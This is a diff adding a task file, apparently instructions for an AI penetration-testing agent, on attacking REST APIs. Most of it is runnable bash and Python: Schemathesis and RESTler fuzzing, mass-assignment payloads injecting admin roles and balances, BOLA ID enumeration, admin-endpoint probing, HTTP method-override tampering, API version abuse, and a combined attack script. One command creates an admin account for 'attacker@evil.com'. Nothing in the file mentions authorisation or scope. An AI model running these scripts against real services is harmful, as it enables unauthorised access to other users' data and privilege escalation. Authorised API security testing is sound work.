@@ -1,0 +1,792 @@
+================================================================================
+TASK 70 · REST API ATTACKS
+================================================================================
+Covers testing_toolkit.txt Phase 8 Step 28
+Schemathesis fuzzing, RESTler stateful testing, mass assignment, BOLA/BFLA.
+
+OBJECTIVE:
+- Fuzz REST APIs using OpenAPI/Swagger specs
+- Stateful API testing with RESTler
+- Exploit mass assignment vulnerabilities
+- Test BOLA (Broken Object Level Authorization)
+- Test BFLA (Broken Function Level Authorization)
+- HTTP method tampering and verb abuse
+
+================================================================================
+INPUTS
+================================================================================
+outputs/api_endpoints_from_openapi.txt     ← Extracted endpoints
+outputs/api_docs_urls.txt                  ← Swagger/OpenAPI spec URLs
+outputs/live_base_urls.txt                 ← Live base URLs
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/api/
+├── schemathesis_results.json       ← Fuzzing findings
+├── restler_bugs/                   ← RESTler discovered bugs
+├── mass_assignment_results.txt     ← Mass assignment vulns
+├── bola_results.txt                ← IDOR/BOLA findings
+├── bfla_results.txt                ← Function auth bypass
+├── method_tampering_results.txt    ← HTTP verb abuse
+└── api_attack_log.txt              ← Full execution log
+
+================================================================================
+🧠 REST API SECURITY FUNDAMENTALS 🧠
+================================================================================
+
+───────────────────────────────────────
+OWASP API Security Top 10 (2023)
+───────────────────────────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ #  │ Vulnerability                │ Attack Method                         │
+├────┼──────────────────────────────┼───────────────────────────────────────┤
+│ 1  │ BOLA (Broken Object Auth)    │ Change IDs to access others' data     │
+│ 2  │ Broken Authentication        │ Token manipulation, weak auth         │
+│ 3  │ BOPLA (Object Property)      │ Mass assignment, excessive data       │
+│ 4  │ Unrestricted Resource        │ Missing pagination, large queries     │
+│ 5  │ BFLA (Function Auth)         │ Access admin endpoints as user        │
+│ 6  │ Server-Side Request Forgery  │ URL parameters to internal services   │
+│ 7  │ Security Misconfiguration    │ Verbose errors, CORS, headers         │
+│ 8  │ Lack of Protection           │ No rate limit, no validation          │
+│ 9  │ Improper Inventory           │ Shadow APIs, deprecated versions      │
+│ 10 │ Unsafe API Consumption       │ Third-party API trust issues          │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+PHASE 1: SCHEMATHESIS - OPENAPI FUZZING
+================================================================================
+
+───────────────────────────────────────
+1.1 Install Schemathesis
+───────────────────────────────────────
+pip install schemathesis
+
+# Verify installation
+schemathesis --version
+
+───────────────────────────────────────
+1.2 Basic Fuzzing with OpenAPI Spec
+───────────────────────────────────────
+# Fuzz all endpoints from spec
+schemathesis run https://target.com/api/openapi.json
+
+# With authentication
+schemathesis run https://target.com/api/openapi.json \
+    --auth "user:password"
+
+# Bearer token auth
+schemathesis run https://target.com/api/openapi.json \
+    --header "Authorization: Bearer TOKEN"
+
+# API key auth
+schemathesis run https://target.com/api/openapi.json \
+    --header "X-API-Key: YOUR_KEY"
+
+───────────────────────────────────────
+1.3 Advanced Schemathesis Options
+───────────────────────────────────────
+# Full fuzzing with all checks
+schemathesis run https://target.com/api/openapi.json \
+    --checks all \
+    --hypothesis-max-examples 1000 \
+    --workers 4 \
+    --base-url https://target.com \
+    --report outputs/api/schemathesis_results.json
+
+# Specific endpoint testing
+schemathesis run https://target.com/api/openapi.json \
+    --endpoint "/users/{id}" \
+    --method GET POST PUT DELETE
+
+# Target specific tags
+schemathesis run https://target.com/api/openapi.json \
+    --tag "users" \
+    --tag "admin"
+
+───────────────────────────────────────
+1.4 Schemathesis Security Checks
+───────────────────────────────────────
+# Available checks:
+# - not_a_server_error: 5xx responses
+# - status_code_conformance: Matches spec
+# - content_type_conformance: Correct content-type
+# - response_schema_conformance: Response matches schema
+# - negative_data_rejection: Bad input rejected
+
+# Security-focused run
+schemathesis run https://target.com/api/openapi.json \
+    --checks all \
+    --hypothesis-phases explicit generate \
+    --stateful links \
+    --validate-schema false  # Test even with invalid spec
+
+───────────────────────────────────────
+1.5 Schemathesis Stateful Testing
+───────────────────────────────────────
+# Use response data in subsequent requests (e.g., created IDs)
+schemathesis run https://target.com/api/openapi.json \
+    --stateful links \
+    --hypothesis-max-examples 500
+
+# This chains: POST /users → GET /users/{id} using returned ID
+
+───────────────────────────────────────
+1.6 Custom Schemathesis Hooks
+───────────────────────────────────────
+# hooks.py - Custom test logic
+import schemathesis
+
+@schemathesis.hook
+def before_generate_case(context, case):
+    # Add custom header to all requests
+    case.headers = case.headers or {}
+    case.headers["X-Custom-Header"] = "test"
+
+@schemathesis.hook  
+def after_call(context, case, response):
+    # Custom vulnerability detection
+    if "password" in response.text.lower():
+        raise AssertionError("Password leaked in response!")
+
+# Run with hooks
+schemathesis run spec.json --hooks hooks.py
+
+================================================================================
+PHASE 2: RESTLER - STATEFUL API FUZZING
+================================================================================
+
+───────────────────────────────────────
+2.1 Install RESTler
+───────────────────────────────────────
+# RESTler from Microsoft Research
+# https://github.com/microsoft/restler-fuzzer
+
+# Using Docker (recommended)
+docker pull mcr.microsoft.com/restler
+
+# Or install from source
+git clone https://github.com/microsoft/restler-fuzzer
+cd restler-fuzzer
+python ./build-restler.py --dest_dir /opt/restler
+
+───────────────────────────────────────
+2.2 Compile OpenAPI Spec
+───────────────────────────────────────
+# RESTler compiles spec to grammar
+/opt/restler/Restler compile \
+    --api_spec openapi.json \
+    --grammar_file_path outputs/api/restler_grammar/
+
+# This generates:
+# - grammar.py: Request templates
+# - dict.json: Fuzz dictionary
+# - engine_settings.json: Configuration
+
+───────────────────────────────────────
+2.3 RESTler Test Modes
+───────────────────────────────────────
+# 1. Test mode - Quick validation
+/opt/restler/Restler test \
+    --grammar_file outputs/api/restler_grammar/grammar.py \
+    --dictionary_file outputs/api/restler_grammar/dict.json \
+    --settings outputs/api/restler_grammar/engine_settings.json \
+    --no_ssl
+
+# 2. Fuzz-lean - Fast security testing
+/opt/restler/Restler fuzz-lean \
+    --grammar_file grammar.py \
+    --dictionary_file dict.json \
+    --time_budget 1  # 1 hour
+
+# 3. Fuzz mode - Deep fuzzing
+/opt/restler/Restler fuzz \
+    --grammar_file grammar.py \
+    --dictionary_file dict.json \
+    --time_budget 4  # 4 hours
+
+───────────────────────────────────────
+2.4 RESTler Bug Buckets
+───────────────────────────────────────
+# RESTler categorizes findings:
+
+# BUG TYPES:
+# - 500 Internal Server Error
+# - 20x status with error body
+# - Use-after-free (deleted resource still accessible)
+# - Resource hierarchy violations
+# - Invalid dynamic object checker failures
+
+# Results in: Restler/RestlerResults/bug_buckets/
+
+───────────────────────────────────────
+2.5 RESTler with Authentication
+───────────────────────────────────────
+# Create token refresh script
+# token_refresh.py
+import requests
+
+def get_token():
+    resp = requests.post("https://target.com/auth/login", 
+        json={"user": "test", "pass": "test123"})
+    return resp.json()["token"]
+
+if __name__ == "__main__":
+    print(get_token())
+
+# Use in RESTler
+/opt/restler/Restler fuzz \
+    --grammar_file grammar.py \
+    --token_refresh_cmd "python token_refresh.py" \
+    --token_refresh_interval 300
+
+================================================================================
+PHASE 3: MASS ASSIGNMENT ATTACKS
+================================================================================
+
+───────────────────────────────────────
+3.1 Understanding Mass Assignment
+───────────────────────────────────────
+# Mass assignment: API accepts more fields than intended
+# Developer expects: {"name": "John"}
+# Attacker sends: {"name": "John", "role": "admin", "verified": true}
+
+# If API blindly accepts all fields → privilege escalation
+
+───────────────────────────────────────
+3.2 Identify Mass Assignment Targets
+───────────────────────────────────────
+# Look for:
+# - User registration/update endpoints
+# - Profile update
+# - Account settings
+# - Any PUT/PATCH/POST that modifies objects
+
+# From OpenAPI spec, find writeable endpoints
+cat openapi.json | jq '
+    .paths | to_entries[] | 
+    select(.value.put or .value.patch or .value.post) |
+    {path: .key, methods: [.value | keys[] | select(. == "put" or . == "patch" or . == "post")]}
+'
+
+───────────────────────────────────────
+3.3 Mass Assignment Payload Generator
+───────────────────────────────────────
+#!/bin/bash
+# mass_assignment_test.sh
+
+TARGET="$1"
+ENDPOINT="$2"
+AUTH="$3"
+
+# Common privileged fields to inject
+FIELDS=(
+    '"role": "admin"'
+    '"isAdmin": true'
+    '"is_admin": true'
+    '"admin": true'
+    '"userType": "admin"'
+    '"user_type": "administrator"'
+    '"permissions": ["*"]'
+    '"scope": "admin"'
+    '"verified": true'
+    '"emailVerified": true'
+    '"active": true'
+    '"approved": true'
+    '"balance": 999999'
+    '"credits": 999999'
+    '"price": 0'
+    '"discount": 100'
+    '"isFree": true'
+    '"subscriptionTier": "enterprise"'
+    '"plan": "premium"'
+)
+
+echo "[*] Testing mass assignment on $ENDPOINT"
+
+for field in "${FIELDS[@]}"; do
+    echo "[*] Testing: $field"
+    
+    # Build payload with legitimate + injected field
+    payload="{\"name\": \"TestUser\", $field}"
+    
+    response=$(curl -s -X PUT "$TARGET$ENDPOINT" \
+        -H "Content-Type: application/json" \
+        -H "Authorization: Bearer $AUTH" \
+        -d "$payload")
+    
+    # Check if field was accepted
+    field_name=$(echo "$field" | cut -d'"' -f2)
+    if echo "$response" | grep -qi "$field_name"; then
+        echo "    [!] Field potentially accepted: $field_name"
+        echo "$ENDPOINT: $field" >> outputs/api/mass_assignment_results.txt
+    fi
+done
+
+───────────────────────────────────────
+3.4 Mass Assignment via Different Methods
+───────────────────────────────────────
+# Try different HTTP methods
+for method in PUT PATCH POST; do
+    curl -s -X $method "$TARGET/api/users/me" \
+        -H "Content-Type: application/json" \
+        -H "Authorization: Bearer $TOKEN" \
+        -d '{"name": "Test", "role": "admin"}'
+done
+
+# Try array injection
+curl -X PUT "$TARGET/api/users/me" \
+    -d '{"roles": ["user", "admin"]}'
+
+# Try nested object injection
+curl -X PATCH "$TARGET/api/profile" \
+    -d '{"user": {"role": "admin"}}'
+
+───────────────────────────────────────
+3.5 Arjun for Hidden Parameter Discovery
+───────────────────────────────────────
+# Find hidden/undocumented parameters
+arjun -u "https://target.com/api/users" -m POST \
+    --headers "Authorization: Bearer $TOKEN" \
+    -o outputs/api/hidden_params.txt
+
+# Use discovered params for mass assignment
+
+================================================================================
+PHASE 4: BOLA (BROKEN OBJECT LEVEL AUTHORIZATION)
+================================================================================
+
+───────────────────────────────────────
+4.1 BOLA Attack Pattern
+───────────────────────────────────────
+# BOLA = IDOR at API level
+# Change object ID to access another user's resource
+
+# Example vulnerable endpoint:
+GET /api/users/123/profile       # Your profile
+GET /api/users/456/profile       # Someone else's profile (if vulnerable)
+
+GET /api/orders/1001            # Your order
+GET /api/orders/1002            # Someone else's order
+
+───────────────────────────────────────
+4.2 BOLA Scanner Script
+───────────────────────────────────────
+#!/bin/bash
+# bola_scanner.sh
+
+TARGET="$1"
+MY_TOKEN="$2"
+MY_ID="$3"
+VICTIM_ID="$4"
+
+OUTPUT="outputs/api/bola_results.txt"
+echo "BOLA Scan Results" > "$OUTPUT"
+echo "=================" >> "$OUTPUT"
+
+# Endpoints with object IDs
+ENDPOINTS=(
+    "/api/users/{id}"
+    "/api/users/{id}/profile"
+    "/api/users/{id}/settings"
+    "/api/users/{id}/orders"
+    "/api/orders/{id}"
+    "/api/documents/{id}"
+    "/api/messages/{id}"
+    "/api/accounts/{id}"
+    "/api/files/{id}"
+    "/api/invoices/{id}"
+)
+
+echo "[*] Testing BOLA vulnerabilities"
+
+for endpoint in "${ENDPOINTS[@]}"; do
+    # Replace {id} with victim ID
+    test_url=$(echo "$endpoint" | sed "s/{id}/$VICTIM_ID/g")
+    
+    echo "[*] Testing: $test_url"
+    
+    response=$(curl -s -o /dev/null -w "%{http_code}" \
+        "$TARGET$test_url" \
+        -H "Authorization: Bearer $MY_TOKEN")
+    
+    if [ "$response" = "200" ]; then
+        echo "    [!] BOLA FOUND: Accessed $test_url with wrong auth!"
+        echo "VULNERABLE: $test_url" >> "$OUTPUT"
+    elif [ "$response" = "403" ] || [ "$response" = "401" ]; then
+        echo "    [+] Protected"
+    fi
+done
+
+───────────────────────────────────────
+4.3 BOLA ID Enumeration Techniques
+───────────────────────────────────────
+# Sequential IDs
+for id in $(seq 1 1000); do
+    curl -s "$TARGET/api/users/$id" -H "Auth: $TOKEN"
+done
+
+# UUID patterns (if leaked elsewhere)
+# Check JWT payload for user IDs
+echo "$JWT" | cut -d'.' -f2 | base64 -d | jq '.sub, .user_id'
+
+# Check other responses for ID leaks
+grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
+    responses/*.json | sort -u
+
+───────────────────────────────────────
+4.4 BOLA via Parameter Pollution
+───────────────────────────────────────
+# Sometimes auth checked on one param, data fetched from another
+
+# Double parameter
+GET /api/profile?user_id=123&user_id=456
+
+# Array parameter
+GET /api/profile?user_id[]=123&user_id[]=456
+
+# JSON in query
+GET /api/profile?filter={"user_id": 456}
+
+================================================================================
+PHASE 5: BFLA (BROKEN FUNCTION LEVEL AUTHORIZATION)
+================================================================================
+
+───────────────────────────────────────
+5.1 BFLA Attack Pattern
+───────────────────────────────────────
+# BFLA = Accessing functions you shouldn't have access to
+# Regular user accessing admin endpoints
+
+# Example:
+GET /api/users              # Normal user endpoint
+GET /api/admin/users        # Admin endpoint (if vulnerable, accessible)
+DELETE /api/admin/users/123 # Admin-only action
+
+───────────────────────────────────────
+5.2 Admin Endpoint Discovery
+───────────────────────────────────────
+#!/bin/bash
+# bfla_scanner.sh
+
+TARGET="$1"
+USER_TOKEN="$2"
+
+# Common admin/privileged endpoints
+ADMIN_ENDPOINTS=(
+    "/api/admin"
+    "/api/admin/users"
+    "/api/admin/settings"
+    "/api/admin/config"
+    "/api/admin/logs"
+    "/api/admin/dashboard"
+    "/api/internal"
+    "/api/internal/metrics"
+    "/api/management"
+    "/api/system"
+    "/api/debug"
+    "/api/actuator"
+    "/api/actuator/env"
+    "/api/actuator/heapdump"
+    "/api/console"
+    "/api/swagger"
+    "/api/graphql"
+    "/api/v1/admin"
+    "/api/v2/admin"
+    "/admin/api"
+    "/private/api"
+)
+
+echo "[*] Testing BFLA - Admin endpoint access"
+
+for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
+    response=$(curl -s -o /dev/null -w "%{http_code}" \
+        "$TARGET$endpoint" \
+        -H "Authorization: Bearer $USER_TOKEN")
+    
+    if [ "$response" = "200" ]; then
+        echo "[!] BFLA: $endpoint accessible!"
+        echo "$endpoint" >> outputs/api/bfla_results.txt
+    fi
+done
+
+───────────────────────────────────────
+5.3 HTTP Method Testing for BFLA
+───────────────────────────────────────
+# Sometimes GET blocked but POST/PUT/DELETE allowed
+
+ENDPOINT="/api/admin/users"
+METHODS="GET POST PUT PATCH DELETE OPTIONS HEAD"
+
+for method in $METHODS; do
+    code=$(curl -s -o /dev/null -w "%{http_code}" \
+        -X $method "$TARGET$ENDPOINT" \
+        -H "Authorization: Bearer $USER_TOKEN")
+    echo "$method $ENDPOINT: $code"
+done
+
+───────────────────────────────────────
+5.4 Role Elevation via API
+───────────────────────────────────────
+# Try to access role management endpoints
+
+# List roles
+curl "$TARGET/api/roles" -H "Auth: $TOKEN"
+
+# Assign role to self
+curl -X POST "$TARGET/api/users/me/roles" \
+    -H "Auth: $TOKEN" \
+    -d '{"roleId": 1}'  # Admin role?
+
+# Create admin user
+curl -X POST "$TARGET/api/admin/users" \
+    -H "Auth: $TOKEN" \
+    -d '{"email": "attacker@evil.com", "role": "admin"}'
+
+================================================================================
+PHASE 6: HTTP METHOD TAMPERING
+================================================================================
+
+───────────────────────────────────────
+6.1 Method Override Headers
+───────────────────────────────────────
+# Some frameworks allow method override via headers
+
+# X-HTTP-Method-Override
+curl -X POST "$TARGET/api/users/123" \
+    -H "X-HTTP-Method-Override: DELETE"
+
+# X-Method-Override
+curl -X GET "$TARGET/api/admin" \
+    -H "X-Method-Override: POST"
+
+# X-HTTP-Method
+curl -X POST "$TARGET/api/resource" \
+    -H "X-HTTP-Method: PUT"
+
+───────────────────────────────────────
+6.2 Content-Type Manipulation
+───────────────────────────────────────
+# Try different content types to bypass validation
+
+# JSON to form-urlencoded
+curl -X POST "$TARGET/api/login" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "username=admin&password=test"
+
+# Form to JSON
+curl -X POST "$TARGET/api/login" \
+    -H "Content-Type: application/json" \
+    -d '{"username": "admin", "password": "test"}'
+
+# XML payload
+curl -X POST "$TARGET/api/data" \
+    -H "Content-Type: application/xml" \
+    -d '<?xml version="1.0"?><user><name>admin</name></user>'
+
+───────────────────────────────────────
+6.3 HTTP Verb Tampering Script
+───────────────────────────────────────
+#!/bin/bash
+# method_tampering.sh
+
+TARGET="$1"
+ENDPOINT="$2"
+
+METHODS="GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT"
+OVERRIDE_HEADERS=(
+    "X-HTTP-Method-Override"
+    "X-Method-Override"  
+    "X-HTTP-Method"
+    "_method"
+)
+
+echo "[*] Testing HTTP method tampering on $ENDPOINT"
+
+# Direct method testing
+for method in $METHODS; do
+    code=$(curl -s -o /dev/null -w "%{http_code}" \
+        -X $method "$TARGET$ENDPOINT")
+    echo "Direct $method: $code"
+done
+
+# Override header testing
+for header in "${OVERRIDE_HEADERS[@]}"; do
+    for method in DELETE PUT PATCH; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST "$TARGET$ENDPOINT" \
+            -H "$header: $method")
+        echo "POST + $header=$method: $code"
+    done
+done
+
+================================================================================
+PHASE 7: API VERSION ABUSE
+================================================================================
+
+───────────────────────────────────────
+7.1 Version Discovery
+───────────────────────────────────────
+# Old API versions may lack security controls
+
+VERSIONS="v1 v2 v3 v4 v5 v0 v1.0 v2.0 v1-beta v2-beta"
+
+for ver in $VERSIONS; do
+    # Path versioning
+    curl -s -o /dev/null -w "%{http_code} /api/$ver/users\n" \
+        "$TARGET/api/$ver/users"
+    
+    # Header versioning
+    curl -s -o /dev/null -w "%{http_code} Accept-Version: $ver\n" \
+        "$TARGET/api/users" \
+        -H "Accept-Version: $ver"
+    
+    # Query versioning
+    curl -s -o /dev/null -w "%{http_code} ?version=$ver\n" \
+        "$TARGET/api/users?version=$ver"
+done
+
+───────────────────────────────────────
+7.2 Deprecated Endpoint Testing
+───────────────────────────────────────
+# Test v1 endpoints even when v2 is current
+# Old versions often have:
+# - Weaker authentication
+# - Missing rate limits
+# - Verbose error messages
+# - BOLA/BFLA vulnerabilities
+
+================================================================================
+PHASE 8: COMPLETE API ATTACK SCRIPT
+================================================================================
+
+#!/bin/bash
+# complete_api_attacks.sh
+
+TARGET="$1"
+SPEC_URL="$2"
+AUTH_TOKEN="$3"
+OUTPUT_DIR="outputs/api"
+
+mkdir -p "$OUTPUT_DIR"
+
+echo "═══════════════════════════════════════════════════════════════"
+echo " REST API Security Testing"
+echo " Target: $TARGET"
+echo "═══════════════════════════════════════════════════════════════"
+
+# PHASE 1: Schemathesis fuzzing
+echo ""
+echo "[PHASE 1] Schemathesis API Fuzzing"
+echo "───────────────────────────────────────"
+
+if [ -n "$SPEC_URL" ]; then
+    schemathesis run "$SPEC_URL" \
+        --checks all \
+        --header "Authorization: Bearer $AUTH_TOKEN" \
+        --hypothesis-max-examples 200 \
+        --report "$OUTPUT_DIR/schemathesis_results.json" \
+        2>&1 | tee "$OUTPUT_DIR/schemathesis_log.txt"
+fi
+
+# PHASE 2: BOLA Testing
+echo ""
+echo "[PHASE 2] BOLA/IDOR Testing"
+echo "───────────────────────────────────────"
+
+for id in 1 2 3 100 1000; do
+    for endpoint in "/api/users/$id" "/api/orders/$id" "/api/files/$id"; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" \
+            "$TARGET$endpoint" \
+            -H "Authorization: Bearer $AUTH_TOKEN")
+        
+        if [ "$code" = "200" ]; then
+            echo "[!] BOLA: $endpoint accessible"
+            echo "$endpoint" >> "$OUTPUT_DIR/bola_results.txt"
+        fi
+    done
+done
+
+# PHASE 3: BFLA Testing
+echo ""
+echo "[PHASE 3] BFLA Testing"
+echo "───────────────────────────────────────"
+
+ADMIN_PATHS="/api/admin /api/internal /api/management /admin"
+for path in $ADMIN_PATHS; do
+    code=$(curl -s -o /dev/null -w "%{http_code}" \
+        "$TARGET$path" \
+        -H "Authorization: Bearer $AUTH_TOKEN")
+    
+    if [ "$code" = "200" ]; then
+        echo "[!] BFLA: $path accessible as regular user"
+        echo "$path" >> "$OUTPUT_DIR/bfla_results.txt"
+    fi
+done
+
+# PHASE 4: Mass Assignment
+echo ""
+echo "[PHASE 4] Mass Assignment Testing"
+echo "───────────────────────────────────────"
+
+for field in "role" "isAdmin" "admin" "verified" "balance"; do
+    response=$(curl -s -X PUT "$TARGET/api/users/me" \
+        -H "Authorization: Bearer $AUTH_TOKEN" \
+        -H "Content-Type: application/json" \
+        -d "{\"name\": \"Test\", \"$field\": true}")
+    
+    if echo "$response" | grep -qi "$field"; then
+        echo "[!] Mass assignment: $field may be accepted"
+        echo "$field" >> "$OUTPUT_DIR/mass_assignment_results.txt"
+    fi
+done
+
+echo ""
+echo "[*] API attack testing complete. Results in $OUTPUT_DIR"
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+
+ATTACK PRIORITY:
+────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Priority │ Attack              │ Impact                                    │
+├──────────┼─────────────────────┼───────────────────────────────────────────┤
+│ 1        │ BOLA                │ Access any user's data                    │
+│ 2        │ BFLA                │ Admin function access                     │
+│ 3        │ Mass Assignment     │ Privilege escalation                      │
+│ 4        │ Schemathesis Fuzz   │ Crashes, errors, unexpected behavior      │
+│ 5        │ Method Tampering    │ Bypass access controls                    │
+│ 6        │ Version Abuse       │ Access deprecated vulnerable endpoints    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+CRITICAL CHECKS:
+────────────────
+□ Run Schemathesis against OpenAPI spec
+□ Test BOLA on all object-accessing endpoints
+□ Test BFLA on admin/internal endpoints
+□ Test mass assignment on all write endpoints
+□ Test HTTP method tampering
+□ Check old API versions
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+- Schemathesis: OpenAPI spec fuzzing
+- RESTler: Stateful API testing (Microsoft)
+- Arjun: Hidden parameter discovery
+- Postman: Manual API testing
+- Burp Suite: Proxy and manipulation
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ Schemathesis run against OpenAPI spec
+✓ BOLA tested on user/resource endpoints
+✓ BFLA tested on admin endpoints
+✓ Mass assignment tested on update endpoints
+✓ HTTP method tampering tested
+✓ API versioning abuse tested
+✓ All findings documented with PoC
+
